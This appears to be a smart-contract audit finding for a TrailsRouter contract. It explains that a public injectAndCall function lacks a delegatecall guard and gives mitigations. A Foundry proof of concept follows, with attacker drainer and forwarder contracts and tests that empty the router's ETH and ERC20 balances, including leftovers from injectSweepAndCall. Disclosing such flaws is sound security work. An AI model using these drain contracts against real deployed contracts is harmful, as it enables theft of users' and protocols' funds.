  "body": "## Summary\ninjectAndCall is intended for delegated wallet context but is publicly callable without an onlyDelegatecall guard. It reads address(this) balances and uses them for a caller‑chosen target call, enabling anyone to drain any ETH or ERC20 tokens held by the router contract.\n\n## Description\nThe router exposes two balance‑injection flows: injectSweepAndCall (pulls from msg.sender) and injectAndCall (reads from address(this) for delegated wallet usage). The latter is declared public and lacks any access‑control or delegatecall guard, despite interface docs stating it’s for delegatecalls.\n\nWhen called directly, injectAndCall treats the router’s own balances as the “caller balance,” then forwards ETH or grants ERC20 approval and executes an arbitrary call to a caller‑controlled target. This lets any account drain funds that reside on the router address (leftovers, accidental transfers, or intermediate balances).\n\n```solidity\n// src/TrailsRouter.sol (no onlyDelegatecall on injectAndCall)\nfunction injectAndCall(\n    address token,\n    address target,\n    bytes calldata callData,\n    uint256 amountOffset,\n    bytes32 placeholder\n) public payable {\n    uint256 callerBalance = _getSelfBalance(token);\n    if (callerBalance == 0) { /* reverts omitted */ }\n    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);\n}\n\n// Used by injectAndCall; approves or forwards value, then external call\nfunction _injectAndExecuteCall(\n    address token,\n    address target,\n    bytes memory callData,\n    uint256 amountOffset,\n    bytes32 placeholder,\n    uint256 callerBalance\n) internal {\n    // ... placeholder replacement ...\n    if (token == address(0)) {\n        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);\n        if (!success) revert TargetCallFailed(result);\n    } else {\n        IERC20 erc20 = IERC20(token);\n        SafeERC20.forceApprove(erc20, target, callerBalance);\n        (bool success, bytes memory result) = target.call(callData);\n        if (!success) revert TargetCallFailed(result);\n    }\n}\n```\n\n### Root Cause Analysis\n- injectAndCall is publicly callable and not restricted by onlyDelegatecall even though it assumes delegated wallet context and operates on address(this) balances.\n- The implementation allows arbitrary target and calldata after granting approval or forwarding value sourced from the contract’s own balances.\n- Other sensitive functions (e.g., sweep) correctly require onlyDelegatecall, highlighting inconsistent access control.\n\n### Exploit Scenario\n1. The router holds tokens/ETH (e.g., from prior operations, accidental transfers, or leftovers).\n2. Attacker deploys a drainer contract with a function that pulls tokens from msg.sender or forwards received ETH to the attacker.\n3. Attacker calls injectAndCall(tokenOrETH, drainer, callData, offset, placeholder):\n   - For ERC20: router approves drainer for full router balance and calls drainer; drainer transferFrom(router → attacker, fullBalance).\n   - For ETH: router calls drainer with value = router’s ETH balance; drainer forwards ETH to attacker.\n4. Router’s balances are fully drained without any authorization check.\n\n\n### Additional exploit vector: Leftovers from injectSweepAndCall\n- Flow:\n  1) Victim calls `injectSweepAndCall(token, target, ...)`, router pulls N tokens from victim and approves `target` for N.\n  2) `target` only pulls N - d via `transferFrom(msg.sender=router, receiver, N - d)`, leaving d tokens stranded on the router.\n  3) Any EOA later calls `injectAndCall(token, attackerTarget, ...)` to force-approve `attackerTarget` for the router’s current balance (d), and drain via `transferFrom(router, attacker, d)`.\n\n\n### Relevant Context\n- Interface docs label injectAndCall as “For delegatecalls from Sequence wallets,” but the implementation is callable by anyone.\n- The delegated entry path uses _injectAndCallDelegated, suggesting injectAndCall was meant to be restricted similarly to sweep/refund flows.\n\n## Impact\n- Direct theft of any ERC20 tokens or ETH held by the router.\n- High severity: permissionless balance drain of protocol‑owned assets at the router address; trivial to exploit if any funds accumulate.\n\n## Recommended Mitigation\n- Restrict injectAndCall with onlyDelegatecall (and/or stronger auth) to ensure it’s only reachable in intended wallet delegate context.\n- Alternatively remove the public entry point and route delegated usage exclusively via handleSequenceDelegateCall → _injectAndCallDelegated.\n- Consider a zero‑balance invariant for the router: proactively sweep/flush to prevent funds from lingering on the contract address.",
  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {TrailsRouter} from \"src/TrailsRouter.sol\";\nimport {MockERC20} from \"test/mocks/MockERC20.sol\";\nimport {MockMulticall3} from \"test/mocks/MockMulticall3.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n// -------------------------------------------------------------------------\n// Auth Bypass PoC: Public injectAndCall Drains Router Balances\n// -------------------------------------------------------------------------\n/// @title TrailsRouter_AuthBypass_PoC\n/// @notice Demonstrates that injectAndCall is publicly callable without\n///         onlyDelegatecall guard, allowing anyone to drain router's ETH/ERC20\n/// @dev Finding: Auth bypass: public injectAndCall lets anyone forward\n///      all router ETH or approve-drain all router ERC20s\n///\n/// Vulnerability:\n/// - injectAndCall is meant for delegatecall context (wallet) but has no auth guard\n/// - It reads address(this) balance and spends it toward caller-controlled target\n/// - For ETH: forwards full router ETH balance to target\n/// - For ERC20: grants allowance equal to router's full token balance to target\n/// - Attacker can drain any ETH/tokens residing on router address\n///\n/// Attack Flow (ERC20):\n/// 1. Router has ERC20 balance (from leftovers, pullAmountAndExecute, etc.)\n/// 2. Attacker calls injectAndCall(token, attackerContract, callData, ...)\n/// 3. injectAndCall reads router's token balance\n/// 4. injectAndCall approves attackerContract for full balance\n/// 5. attackerContract calls transferFrom(router, attacker, balance)\n/// 6. All tokens drained from router\n///\n/// Attack Flow (ETH):\n/// 1. Router has ETH balance (from accidental sends, leftover value, etc.)\n/// 2. Attacker calls injectAndCall(address(0), attackerContract, callData, ...)\n/// 3. injectAndCall reads router's ETH balance\n/// 4. injectAndCall forwards full ETH balance to attackerContract\n/// 5. attackerContract forwards ETH to attacker\n/// 6. All ETH drained from router\n///\n/// Impact: Direct theft of any ETH/tokens on router address\n/// Severity: HIGH (direct asset loss, permissionless exploit)\ncontract TrailsRouter_AuthBypass_PoC is Test {\n    // -------------------------------------------------------------------------\n    // State Variables\n    // -------------------------------------------------------------------------\n\n    TrailsRouter public router;\n    MockERC20 public token;\n\n    address public attacker;\n    address public victim;\n\n    // -------------------------------------------------------------------------\n    // Events (for verification)\n    // -------------------------------------------------------------------------\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    // -------------------------------------------------------------------------\n    // Setup\n    // -------------------------------------------------------------------------\n\n    function setUp() public {\n        // Deploy mock multicall3 at the expected address\n        MockMulticall3 mockMulticall3 = new MockMulticall3();\n        vm.etch(\n            0xcA11bde05977b3631167028862bE2a173976CA11,\n            address(mockMulticall3).code\n        );\n\n        // Deploy TrailsRouter\n        router = new TrailsRouter();\n\n        // Deploy mock ERC20 token\n        token = new MockERC20(\"MockToken\", \"MTK\", 18);\n\n        // Setup actors\n        attacker = makeAddr(\"attacker\");\n        victim = makeAddr(\"victim\");\n\n        // Fund victim\n        vm.deal(victim, 100 ether);\n        token.mint(victim, 1_000_000e18);\n    }\n\n    // -------------------------------------------------------------------------\n    // PoC Test 1: Drain ERC20 via Public injectAndCall\n    // -------------------------------------------------------------------------\n\n    /// @dev Demonstrates that anyone can drain router's ERC20 balance via\n    ///      public injectAndCall by approving attacker-controlled target\n    function test_DrainERC20_Via_Public_InjectAndCall() public {\n        // Arrange: Seed router with ERC20 balance (simulating leftovers from prior calls)\n        uint256 routerBalance = 200_000e18;\n        token.mint(address(router), routerBalance);\n\n        // Verify initial balances\n        assertEq(\n            token.balanceOf(address(router)),\n            routerBalance,\n            \"Router should have tokens\"\n        );\n        assertEq(token.balanceOf(attacker), 0, \"Attacker should have 0 tokens\");\n\n        // Deploy attacker's drainer contract\n        ERC20Drainer drainer = new ERC20Drainer();\n\n        // Prepare calldata for drainer.rug(token, attacker, PLACEHOLDER)\n        bytes32 PLACEHOLDER = keccak256(\"PLACEHOLDER\");\n        bytes memory callData = abi.encodeWithSelector(\n            ERC20Drainer.rug.selector,\n            address(token),\n            attacker,\n            uint256(PLACEHOLDER) // Will be replaced with actual balance\n        );\n\n        // Calculate offset of amount parameter (3rd parameter)\n        // Selector (4 bytes) + token address (32 bytes) + attacker address (32 bytes) = 68 bytes\n        uint256 amountOffset = 4 + 32 + 32;\n\n        // Act: Attacker calls injectAndCall (publicly callable, no auth!)\n        // This will:\n        // 1. Read router's token balance (200k tokens)\n        // 2. Approve drainer for 200k tokens\n        // 3. Call drainer.rug(token, attacker, 200k)\n        // 4. drainer calls transferFrom(router, attacker, 200k)\n\n        vm.prank(attacker);\n        router.injectAndCall(\n            address(token), // token to inject\n            address(drainer), // target (attacker-controlled)\n            callData, // calldata with placeholder\n            amountOffset, // offset to replace placeholder\n            PLACEHOLDER // placeholder value\n        );\n\n        // Assert: Router drained, attacker received all tokens\n        assertEq(\n            token.balanceOf(address(router)),\n            0,\n            \"Router should be drained\"\n        );\n        assertEq(\n            token.balanceOf(attacker),\n            routerBalance,\n            \"Attacker should receive all tokens\"\n        );\n\n        // Impact: Direct theft of 200k tokens from router\n        // This demonstrates complete loss of any ERC20 balance on router\n    }\n\n    // -------------------------------------------------------------------------\n    // PoC Test 2: Drain ETH via Public injectAndCall\n    // -------------------------------------------------------------------------\n\n    /// @dev Demonstrates that anyone can drain router's ETH balance via\n    ///      public injectAndCall by forwarding to attacker-controlled target\n    function test_DrainETH_Via_Public_InjectAndCall() public {\n        // Arrange: Seed router with ETH (simulating accidental sends or leftover value)\n        uint256 routerBalance = 10 ether;\n        vm.deal(address(router), routerBalance);\n\n        // Verify initial balances\n        assertEq(\n            address(router).balance,\n            routerBalance,\n            \"Router should have ETH\"\n        );\n        assertEq(attacker.balance, 0, \"Attacker should have 0 ETH\");\n\n        // Deploy attacker's ETH forwarder contract\n        EthForwarder forwarder = new EthForwarder(payable(attacker));\n\n        // Prepare calldata for forwarder.pwn()\n        bytes memory callData = abi.encodeWithSelector(\n            EthForwarder.pwn.selector\n        );\n\n        // For ETH, we don't need to replace any placeholder\n        // Set both amountOffset and placeholder to 0 to skip replacement\n        uint256 amountOffset = 0;\n        bytes32 placeholder = bytes32(0);\n\n        // Act: Attacker calls injectAndCall with token=address(0) for ETH\n        // This will:\n        // 1. Read router's ETH balance (10 ETH)\n        // 2. Forward 10 ETH to forwarder via call{value: 10 ether}\n        // 3. forwarder.pwn() forwards ETH to attacker\n\n        vm.prank(attacker);\n        router.injectAndCall(\n            address(0), // address(0) = ETH\n            address(forwarder), // target (attacker-controlled)\n            callData, // calldata\n            amountOffset, // 0 = skip replacement\n            placeholder // 0 = skip replacement\n        );\n\n        // Assert: Router drained, attacker received all ETH\n        assertEq(address(router).balance, 0, \"Router should be drained\");\n        assertEq(\n            attacker.balance,\n            routerBalance,\n            \"Attacker should receive all ETH\"\n        );\n\n        // Impact: Direct theft of 10 ETH from router\n        // This demonstrates complete loss of any ETH balance on router\n    }\n    // -------------------------------------------------------------------------\n    // PoC Test 3: Drain ERC20 leftovers from injectSweepAndCall via Public injectAndCall\n    // -------------------------------------------------------------------------\n\n    /// @dev Demonstrates the R2 [H-5] vector: injectSweepAndCall leaves leftovers on\n    ///      the router when the target only partially pulls; then a third-party drains\n    ///      leftovers via public injectAndCall by approving an attacker-controlled target\n    function test_DrainLeftovers_After_InjectSweepAndCall() public {\n        // Arrange: Victim approves router for sweeping\n        vm.prank(victim);\n        token.approve(address(router), type(uint256).max);\n\n        // Choose amounts: sweep victim's entire current balance (N), leave d as leftover\n        uint256 N = token.balanceOf(victim);\n        uint256 d = 1_234e18; // leftover amount attacker will steal\n        // Ensure victim has enough\n        assertGe(token.balanceOf(victim), N, \"victim funded\");\n\n        // Victim holds N tokens\n        // (already minted in setUp)\n\n        // Deploy a target that pulls only part of the approved amount from the router\n        PartialPuller puller = new PartialPuller();\n        uint256 amountToPull = N - d; // leave d on the router\n\n        // Victim calls injectSweepAndCall: router pulls N from victim, approves `puller` for N,\n        // then `puller` transfers only (N - d) from router to receiver, leaving d on router\n        address receiver = makeAddr(\"receiver\");\n        bytes memory pullCalldata = abi.encodeWithSelector(\n            PartialPuller.pull.selector,\n            address(token),\n            amountToPull,\n            receiver\n        );\n\n        vm.prank(victim);\n        router.injectSweepAndCall(\n            address(token),\n            address(puller),\n            pullCalldata,\n            0,\n            bytes32(0)\n        );\n\n        // Assert: Router now holds leftover d\n        assertEq(\n            token.balanceOf(address(router)),\n            d,\n            \"router holds leftover d\"\n        );\n\n        // Attacker deploys drainer and drains leftovers via public injectAndCall\n        ERC20Drainer drainer = new ERC20Drainer();\n        bytes32 PLACEHOLDER = keccak256(\"PLACEHOLDER\");\n        bytes memory drainCalldata = abi.encodeWithSelector(\n            ERC20Drainer.rug.selector,\n            address(token),\n            attacker,\n            uint256(PLACEHOLDER) // will be replaced with router's current balance (d)\n        );\n        uint256 amountOffset = 4 + 32 + 32; // offset of 3rd arg (amount)\n\n        vm.prank(attacker);\n        router.injectAndCall(\n            address(token),\n            address(drainer),\n            drainCalldata,\n            amountOffset,\n            PLACEHOLDER\n        );\n\n        // Assert: router drained; attacker received exactly d\n        assertEq(token.balanceOf(address(router)), 0, \"router drained to zero\");\n        assertEq(token.balanceOf(attacker), d, \"attacker stole leftovers d\");\n    }\n}\n\n// -------------------------------------------------------------------------\n// Attacker Contracts\n// -------------------------------------------------------------------------\n\n/// @dev Attacker-controlled contract that drains ERC20 tokens\n/// @notice Called by router via injectAndCall, pulls tokens via transferFrom\ncontract ERC20Drainer {\n    /// @dev Pulls tokens from msg.sender (router) to recipient\n    /// @param token The ERC20 token to drain\n    /// @param to The recipient address (attacker)\n    /// @param amount The amount to drain (injected by injectAndCall)\n    function rug(address token, address to, uint256 amount) external {\n        // msg.sender here is TrailsRouter (has approved us for `amount`)\n        // Pull tokens from router to attacker\n        IERC20(token).transferFrom(msg.sender, to, amount);\n    }\n}\n\n/// @dev Attacker-controlled contract that forwards ETH\n/// @notice Called by router via injectAndCall, forwards ETH to attacker\ncontract EthForwarder {\n    address payable public recipient;\n\n    constructor(address payable _recipient) {\n        recipient = _recipient;\n    }\n\n    /// @dev Receives ETH from router and forwards to attacker\n    function pwn() external payable {\n        // Forward all received ETH to attacker\n        (bool success, ) = recipient.call{value: msg.value}(\"\");\n        require(success, \"ETH forward failed\");\n    }\n\n    /// @dev Fallback to receive ETH\n    receive() external payable {}\n}\n\n/// @dev Target that only pulls a partial amount from the router, leaving leftovers\ncontract PartialPuller {\n    function pull(\n        address token,\n        uint256 amountToPull,\n        address receiver\n    ) external {\n        IERC20(token).transferFrom(msg.sender, receiver, amountToPull);\n    }\n}\n```",
